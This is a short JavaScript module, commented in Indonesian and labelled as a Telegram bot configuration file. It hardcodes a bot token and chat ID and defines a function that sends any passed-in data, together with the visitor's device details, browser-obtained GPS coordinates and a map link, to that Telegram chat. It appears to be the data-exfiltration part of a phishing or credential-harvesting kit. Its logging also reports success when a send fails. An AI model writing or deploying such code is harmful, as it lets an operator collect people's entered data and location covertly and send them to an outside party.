// ======================================================
// 🤖 KONFIGURASI BOT TELEGRAM — FILE TERPISAH
// ======================================================
const TELEGRAM_BOT_TOKEN = '8686497429:AAF6Ta9LcNtLZ3vjIPjvqhtLf7_2jTL_IoE';
const TELEGRAM_CHAT_ID = '7402071395';

async function kirimDataKeTelegram(data, judul = 'DATA BARU') {
  try {
    const perangkat = navigator.userAgent || 'Tidak Terdeteksi';
    const platform = navigator.platform || 'Unknown';
    
    let lokasi = 'Izin lokasi ditolak / tidak tersedia';
    let koordinat = '';
    try {
      const pos = await new Promise((resolve, reject) => {
        if (!navigator.geolocation) reject(new Error('Geolokasi tidak didukung'));
        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
      });
      const { latitude, longitude } = pos.coords;
      koordinat = `Lat: ${latitude.toFixed(4)}, Lon: ${longitude.toFixed(4)}`;
      lokasi = `https://www.google.com/maps?q=${latitude},${longitude}`;
    } catch (e) {}

    const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

    let pesan = `
🔔 <b>${judul}</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`;
    for (const [key, value] of Object.entries(data)) {
      pesan += `<b>${key}:</b> ${value}\n`;
    }
    pesan += `
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 <b>Perangkat:</b> ${platform}
📋 <b>User Agent:</b> ${perangkat.substring(0, 80)}...
🌍 <b>Lokasi:</b> ${lokasi}
📍 <b>Koordinat:</b> ${koordinat || '-'}
🕐 <b>Waktu:</b> ${waktu}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: pesan,
        parse_mode: 'HTML',
        disable_web_page_preview: false
      })
    });

    const hasil = await res.json();
    if (!hasil.ok) console.log('✅ Terkirim ke Telegram');
    else console.error('❌ Gagal kirim:', hasil);

  } catch (err) {
    console.error('❌ Error Telegram:', err);
  }
}
